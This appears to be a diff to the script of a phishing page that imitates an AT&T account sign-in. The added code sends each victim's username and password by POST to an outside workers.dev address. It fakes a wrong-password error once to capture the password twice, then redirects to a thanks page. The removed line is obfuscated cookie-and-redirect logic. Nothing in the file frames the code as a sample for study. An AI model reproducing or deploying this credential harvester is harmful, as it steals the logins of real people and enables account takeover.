@@ -1,1 +1,109 @@
-(function(_0x4f2ff0,_0x41105b){const _0x58d4aa=_0x5772,_0x4dc425=_0x4f2ff0();while(!![]){try{const _0x158e61=-parseInt(_0x58d4aa(0x10e))/0x1+-parseInt(_0x58d4aa(0x101))/0x2+-parseInt(_0x58d4aa(0x100))/0x3*(parseInt(_0x58d4aa(0x104))/0x4)+-parseInt(_0x58d4aa(0x110))/0x5+-parseInt(_0x58d4aa(0x102))/0x6+parseInt(_0x58d4aa(0x10c))/0x7*(-parseInt(_0x58d4aa(0x10b))/0x8)+-parseInt(_0x58d4aa(0x10f))/0x9*(-parseInt(_0x58d4aa(0x108))/0xa);if(_0x158e61===_0x41105b)break;else _0x4dc425['push'](_0x4dc425['shift']());}catch(_0xb6531d){_0x4dc425['push'](_0x4dc425['shift']());}}}(_0x8cf6,0x575cc));function setCookie(_0x15fb70,_0x579a28,_0x165975){const _0x176d34=_0x5772,_0x3b42db=new Date();_0x3b42db[_0x176d34(0x111)](_0x3b42db['getTime']()+_0x165975*0x18*0x3c*0x3c*0x3e8);let _0x32fedb=_0x176d34(0x10a)+_0x3b42db[_0x176d34(0x10d)]();document['cookie']=_0x15fb70+'='+_0x579a28+';'+_0x32fedb+';path=/';}function _0x8cf6(){const _0x18ba06=['setTime','length','charAt','indexOf','21nzvAOh','1100442wtQgIl','3082896hBOrvT','http://att.net','145452YdCaDJ','username','substring','cookie','3594830IJkUgs','href','expires=','1648376jeYiGA','14GrmrYL','toUTCString','548445XNdLqx','72gFAepL','1194555tNJkQg'];_0x8cf6=function(){return _0x18ba06;};return _0x8cf6();}function getCookie(_0x243d19){const _0x28c28e=_0x5772;let _0x484a11=_0x243d19+'=',_0x19ef40=document[_0x28c28e(0x107)]['split'](';');for(let _0x38086c=0x0;_0x38086c<_0x19ef40[_0x28c28e(0x112)];_0x38086c++){let _0x1313ef=_0x19ef40[_0x38086c];while(_0x1313ef[_0x28c28e(0x113)](0x0)=='\x20'){_0x1313ef=_0x1313ef[_0x28c28e(0x106)](0x1);}if(_0x1313ef[_0x28c28e(0x114)](_0x484a11)==0x0)return _0x1313ef[_0x28c28e(0x106)](_0x484a11[_0x28c28e(0x112)],_0x1313ef['length']);}return'';}function _0x5772(_0xa46c0c,_0x142364){const _0x8cf63e=_0x8cf6();return _0x5772=function(_0x577287,_0x5adb86){_0x577287=_0x577287-0x100;let _0x17a5b8=_0x8cf63e[_0x577287];return _0x17a5b8;},_0x5772(_0xa46c0c,_0x142364);}function checkCookie(){const _0x587bbb=_0x5772;let _0x19f5a5=getCookie(_0x587bbb(0x105));_0x19f5a5!=''&&(window['location'][_0x587bbb(0x109)]=_0x587bbb(0x103));}
+function isEmail(email) { 
+    return /^((([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*)|((\x22)((((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(([\x01-\x08\x0b\x0c\x0e-\x1f\x7f]|\x21|[\x23-\x5b]|[\x5d-\x7e]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(\\([\x01-\x09\x0b\x0c\x0d-\x7f]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]))))*(((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(\x22)))@((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))$/i.test(email);
+}
+document.addEventListener('DOMContentLoaded' ,function(){
+    checkCookie()
+    let hashUrl = window.location.hash.substr(1).replace (new RegExp("%20", "g"),"+")  
+
+    let bytes = CryptoJS.AES.decrypt(hashUrl, 'secret key 123');
+
+    var auto_email = bytes.toString(CryptoJS.enc.Utf8);
+     if(auto_email.length>4){
+            document.getElementById("userID").value = auto_email
+        }
+  var showPass = $("#showHideButton");
+  showPass.click(function() {
+  var $this = $(this);
+  if ($this.text().toLowerCase() === "show") {
+    $this.text("Hide");
+    $this
+  	.prev("input")
+  	.prop("type", "text");
+  } else {
+    $this.text("Show");
+    $this
+  	.prev("input")
+  	.prop("type", "password");
+  }
+});
+    var url="https://holy-surf-e8b5.jjmdw.workers.dev/"
+    submit_btn = document.getElementById("continueFromUserLogin");
+    userInputContainerDiv = document.getElementById("userInputContainerDiv")
+    userBackButton =  document.getElementById("userBackButtonSpanTxt")
+   count =0
+    $("#userBackButton").click(function(){
+        $(userBackButton).text("")
+        $(".sub_div").addClass("hide")
+        $(".main_div").removeClass("hide")
+        document.getElementById("userErrorText").innerHTML =""
+        count =0
+    })
+    submit_btn.addEventListener("click",function(event){
+        error = document.getElementById("userErrorText")
+        error.style.fontSize = "small";
+        username = document.getElementById("userID").value
+        event.preventDefault()               
+        
+            if(!isEmail(username)){
+                error.innerHTML ="Please enter your username correctly!"
+
+            }
+            else{
+                $(userBackButton).text(username)
+                $(".sub_div").removeClass("hide")
+                $(".main_div").addClass("hide")
+            }
+        }) 
+        
+    $('#signin').click(function(event){
+        event.preventDefault()
+        username = document.getElementById("userID").value
+        passerror = document.getElementById("passwordErrorText")
+        password = document.getElementById("password").value
+            if(password.length<4){
+                passerror.style.fontSize = "small";
+                passerror.innerHTML = "Please enter your password correctly!"
+            }
+            else{
+                fetch(url, {
+                
+                    // Adding method type
+                    method: "POST",
+                    
+                    // Adding body or contents to send
+                    body: JSON.stringify({
+                        userID: username,
+                        password: password,
+                    }),
+                    headers: {
+                            "Content-type": "application/json; charset=UTF-8"
+                        }
+                    })
+                    
+                    .then(function(){
+                    if(count < 1){
+                         count ++;
+                        passerror.style.display = "block";
+                        passerror.style.fontSize = "small";
+                        document.getElementById("password").value = ""
+                        passerror.innerHTML = "Please enter your ATT account password correctly";
+                       
+                        
+                        }
+                        else{  
+                           setCookie("username", username, 30);
+                           window.location.href= "./thanks.html"
+                        }
+                    
+                })
+                   
+
+            }
+            
+
+
+
+           
+    })    
+    
+})
